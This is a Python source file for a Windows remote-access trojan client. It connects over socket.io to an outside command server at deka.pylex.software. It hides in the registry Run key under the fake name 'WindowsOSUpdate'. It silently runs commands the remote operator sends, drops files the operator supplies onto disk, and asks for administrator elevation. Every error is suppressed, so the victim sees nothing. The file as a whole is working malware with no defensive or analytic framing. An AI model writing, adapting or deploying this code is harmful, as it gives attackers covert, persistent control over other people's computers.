import socketio
import subprocess
import sys
import base64
import os
import threading
import pyuac
import winreg
import time

# Server URL - change to your server IP/hostname and port
SERVER_URL = 'http://deka.pylex.software:9834/'

sio = socketio.Client()

def add_to_startup():
    # Add this executable to Windows startup via registry
    try:
        exe_path = sys.executable
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsOSUpdate", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except Exception:
        pass  # Fail silently

@sio.event
def connect():
    # Add to startup once connected
    add_to_startup()
    # Start heartbeat thread to keep connection alive
    threading.Thread(target=heartbeat_thread, daemon=True).start()

def heartbeat_thread():
    while True:
        try:
            sio.emit('heartbeat')
            time.sleep(10)
        except Exception:
            break

@sio.event
def disconnect():
    pass

@sio.on('remote_cmd')
def on_remote_cmd(data):
    cmd = data.get('cmd')
    if not cmd:
        return
    try:
        # Run command without shell popup
        completed = subprocess.run(cmd, shell=False, capture_output=True, text=True,
                                   creationflags=subprocess.CREATE_NO_WINDOW)
        output = completed.stdout + completed.stderr
    except Exception as e:
        output = str(e)
    sio.emit('cmd_output', output)

@sio.on('download_file')
def on_download_file(data):
    file_data_b64 = data.get('fileData')
    path = data.get('path')
    if not file_data_b64 or not path:
        return
    try:
        file_bytes = base64.b64decode(file_data_b64)
        # Ensure directory exists
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'wb') as f:
            f.write(file_bytes)
        sio.emit('cmd_output', f"File saved to {path}")
    except Exception as e:
        sio.emit('cmd_output', f"Error saving file: {e}")

@sio.on('elevate')
def on_elevate():
    try:
        if not pyuac.isUserAdmin():
            pyuac.runAsAdmin()
            sio.emit('elevate_response', {'success': True})
        else:
            sio.emit('elevate_response', {'success': False})
    except Exception:
        sio.emit('elevate_response', {'success': False})

def start_client():
    try:
        sio.connect(SERVER_URL)
        sio.wait()
    except Exception:
        # Silent fail, no debug output
        pass

if __name__ == '__main__':
    start_client()
